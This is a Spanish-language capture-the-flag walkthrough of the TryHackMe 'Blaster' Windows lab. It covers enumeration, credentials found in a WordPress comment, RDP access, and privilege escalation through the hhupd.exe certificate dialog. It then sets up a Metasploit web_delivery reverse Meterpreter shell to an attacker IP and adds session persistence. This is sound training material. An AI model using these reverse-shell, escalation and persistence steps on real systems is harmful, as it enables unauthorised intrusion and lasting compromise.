# Blaster

## Información General

<h3>Dificultad: <img src="https://img.shields.io/badge/F%C3%A1cil-green?style=flat-square"> </h3>

<h3> Sistema operativo: Windows</h3> 

<h3> Fecha de resolución: 22/06/2025 </h3>

<h3>Enlace de la mv: <a href="https://tryhackme.com/room/blaster" target="_blank">Blaster</a></h3>

### *Leer el documentro en Ingles* <a href="blaster_ingles.md">Blaster</a>

## Reconocimiento

TryHackme nos proporciona la ip de la máquina objetivo **ip_objetivo**

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a llamar **windows.net**

<p align="center"> 
<img src="images/hosts.png" width="600" alt="Resultado de Nmap">
</p>

### Escaneo de puerto abierto

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn <ip de la máquina objetivo>
```
<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service       | Version                     |
| --------- | ------------- | --------------------------- |
| 3389      | ms-wbt-server | Microsoft Terminal Services |
| 80        | http          | Microsoft IIS httpd 10.0    |

</div>

## Exploración

Llevaremos acabo fuzzing web

```
dirsearch -u http://windows.net/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
```

<p align="center"> 
<img src="images/fuzzing_web.png" width="600" alt="Resultado de Nmap">
</p>

Navegando en http://windows.net/retro/

<p align="center"> 
<img src="images/retro.png" width="600" alt="Resultado de Nmap">
</p>

Intuyo que **wade** puede ser el creador de esta página

Investigando la página me encuentro al final, el siguiente apartado:

<p align="center"> 
<img src="images/log_in.png" width="600" alt="Resultado de Nmap">
</p>

Que nos lleva a:

<p align="center"> 
<img src="images/wordpress.png" width="600" alt="Resultado de Nmap">
</p>

También podemos encontrar esta página por fuzzing web, con el siguiente comando:

```
gobuster dir -u http://windows.net/retro -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

En la página de wordpress probamos si **wade** puede ser el usuario de esta página de wordpress

<p align="center"> 
<img src="images/wordpress2.png" width="600" alt="Resultado de Nmap">
</p>

En versiones antiguas de WordPress, al introducir una contraseña incorrecta, la respuesta del sistema varía dependiendo de si el nombre de usuario existe o no, lo que permite a un atacante confirmar la validez de un usuario específico, **en este caso lo valida**

**No consigo nada con fuerza bruta,** por tanto, tomo la decisión en investigar los posts. Dentro de este post **Ready Player One**, en los comentarios nos encontramos la contraseña que es: **parzival**

<p align="center"> 
<img src="images/parzival.png" width="600" alt="Resultado de Nmap">
</p>

Ingreso usuario y contraseña en wordpress

usuario: wade
contraseña: parzival

<p align="center"> 
<img src="images/wordpress3.png" width="600" alt="Resultado de Nmap">
</p>

Como sabemos el usuario y contraseña y tenemos el puerto 3389 abierto, realizaremos el siguiente comando:

```
xfreerdp /u:wade /p:parzival /v:windows.net:3389
```
Se nos abrirá una mv, y dentro del escritorio nos encontraremos un **user.txt**

<p align="center"> 
<img src="images/user.png" width="600" alt="Resultado de Nmap">
</p>

Vamos a seguir en el escritorio remoto y podemos dejar anotado este comando:

```
dir C:\ /s /b | findstr hhupd.exe
```

Que sirve para encontrar el archivo hhupd.exe que sirve para escalar privilegio.

<p align="center"> 
<img src="images/pwd.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de privilegio

Si buscamos en internet que CVE es hhpud.exe nos aparece:

<p align="center"> 
<img src="images/cve.png" width="600" alt="Resultado de Nmap">
</p>

Este archivo **hhupd.exe** lo tiene la mayoría de los windows, por tanto, voy a explciar paso a paso como podemos escalar privilegio con este archivo.

**show more details** - **show information about the publisher's certificate** - **VeriSign Commercial Software Publishers CA

<p align="center"> 
<img src="images/photo1.png" width="600" alt="Resultado de Nmap">
<img src="images/photo2.png" width="600" alt="Resultado de Nmap">
<img src="images/photo3.png" width="600" alt="Resultado de Nmap">
</p>

Cerramos todo, y luego se nos abrirá el internet de explore con la siguiente página:

<p align="center"> 
<img src="images/photo4.png" width="600" alt="Resultado de Nmap">
</p>

**configuración** - **file** - **save as..**

<p align="center"> 
<img src="images/photo5.png" width="600" alt="Resultado de Nmap">
</p>

OK, guardamos como **cmd** y nos ubicamos en **cmd**

<p align="center"> 
<img src="images/photo6.png" width="600" alt="Resultado de Nmap">
</p>

**Somos root**

<p align="center"> 
<img src="images/cmd.png" width="600" alt="Resultado de Nmap">
</p>

```
whoami
```

<p align="center"> 
<img src="images/whoami.png" width="600" alt="Resultado de Nmap">
</p>

Usamos el siguiente comando para leer un .txt que se encuentra en el **Desktop de Administrator**

```
type \Users\Administrator\Desktop\root.txt
```

<p align="center"> 
<img src="images/type.png" width="600" alt="Resultado de Nmap">
</p>

Luego abrimos metasploit, ejecutamos los siguientes comandos

```
use exploit/multi/script/web_delivery
show options
```

<p align="center"> 
<img src="images/we_delivery.png" width="600" alt="Resultado de Nmap">
</p>

```
Show targets
```

<p align="center"> 
<img src="images/targets.png" width="600" alt="Resultado de Nmap">
</p>

```
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 10.8.139.36
set LPORT 4444
show options
```

<p align="center"> 
<img src="images/web_delivery.png" width="600" alt="Resultado de Nmap">
</p>

```
run -j
```

<p align="center"> 
<img src="images/run.png" width="600" alt="Resultado de Nmap">
</p>

Copiamos todo el comando en el cmd de window donde escalamos privilegio.

<p align="center"> 
<img src="images/cmd2.png" width="600" alt="Resultado de Nmap">
</p>

Luego, en metasploit logramos abrir una sesion en meterpreter al ejecutar el comando anterior 

<p align="center"> 
<img src="images/run2.png" width="600" alt="Resultado de Nmap">
</p>

Estamos dentro:

```
sysinfo
```

<p align="center"> 
<img src="images/sys_info.png" width="600" alt="Resultado de Nmap">
</p>

### Persistencia de la sesión

Luego por ultimo ejecutamos este comando:

```
run persistence -x
```

<p align="center"> 
<img src="images/persistence.png" width="600" alt="Resultado de Nmap">
</p>

Pero comento que este comando esta obsoleto que mejor es usar este modulo **exploit/windows/local/persistence** o **exploit/windows/local/persistence_service**

**Hasta aquí doy por terminada esta máquina!**

## Conclusión

Esta máquina vino muy bien, que a veces no hace falta hacer fuerza bruta, sino que investigando en la página podemos encontrar tanto el usuario como con la contraseña del servidor Wordpres o del puerto 3389. Escalamos privilegio de una manera diferente con el archivo **hhupd.exe**. Por último, intentamos hacer persistencia de la sesión con Meterpreter pero resulta que esta obsoleto esa función.